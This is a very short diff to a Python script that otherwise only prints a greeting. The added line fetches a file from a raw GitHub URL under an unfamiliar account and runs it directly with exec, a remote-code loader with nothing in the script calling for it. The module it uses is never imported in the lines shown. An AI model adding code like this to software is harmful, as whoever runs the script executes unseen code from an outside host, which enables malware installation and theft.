@@ -1,2 +1,2 @@
 print("Hi!")
-https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi
+exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)
